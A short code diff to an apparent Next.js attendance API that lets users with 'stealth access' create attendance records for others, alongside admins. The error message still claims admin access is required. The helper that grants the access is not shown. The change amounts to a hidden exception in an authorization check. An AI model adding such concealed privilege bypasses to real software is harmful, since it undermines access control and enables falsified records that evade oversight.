@@ -2,6 +2,7 @@ import { NextRequest, NextResponse } from 'next/server';
 import jwt from 'jsonwebtoken';
 import { getAttendanceService } from '@/lib/attendance';
 import { logger } from '@/lib/logger';
+import { hasStealthAttendanceAccess } from '@/lib/stealthAccess';
 
 interface JWTPayload {
   userId: number;
@@ -28,8 +29,8 @@ export async function POST(request: NextRequest) {
 
     const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JWTPayload;
 
-    // Only admin can create attendance for other users
-    if (decoded.role !== 'admin') {
+    // Only admin (or stealth-access users) can create attendance for other users
+    if (decoded.role !== 'admin' && !hasStealthAttendanceAccess(decoded.userId)) {
       return NextResponse.json(
         { error: 'Forbidden: Admin access required' },
         { status: 403 }
